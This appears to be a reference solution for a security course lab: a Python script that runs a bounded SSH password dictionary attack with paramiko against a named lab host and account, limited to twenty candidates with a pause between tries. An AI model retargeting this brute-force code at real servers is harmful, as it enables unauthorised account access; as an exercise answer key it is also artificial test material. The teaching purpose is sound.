#!/usr/bin/env python3
"""Reference solution for the bounded Lab 01 SSH dictionary exercise."""

from __future__ import annotations

import argparse
import time
from pathlib import Path

import paramiko

TARGET_HOST = "lab01-ssh-target"
TARGET_PORT = 22
TARGET_USERNAME = "labstudent"
MAX_CANDIDATES = 20


def load_candidates(path: Path) -> list[str]:
    candidates = [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]
    if len(candidates) > MAX_CANDIDATES:
        raise ValueError(f"course SSH wordlist is limited to {MAX_CANDIDATES} candidates")
    return candidates


def try_candidate(candidate: str) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=TARGET_HOST,
            port=TARGET_PORT,
            username=TARGET_USERNAME,
            password=candidate,
            look_for_keys=False,
            allow_agent=False,
            timeout=3,
            banner_timeout=3,
            auth_timeout=3,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()


def dictionary_attack(candidates: list[str], delay: float = 0.25) -> tuple[str | None, int, float]:
    start = time.perf_counter()
    for attempts, candidate in enumerate(candidates, 1):
        if try_candidate(candidate):
            return candidate, attempts, time.perf_counter() - start
        time.sleep(delay)
    return None, len(candidates), time.perf_counter() - start


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("wordlist", type=Path)
    args = parser.parse_args()
    match, attempts, elapsed = dictionary_attack(load_candidates(args.wordlist))
    print(f"Attempts: {attempts}")
    print(f"Elapsed: {elapsed:.3f} seconds")
    print("Result: candidate found" if match is not None else "Result: no candidate matched")


if __name__ == "__main__":
    main()
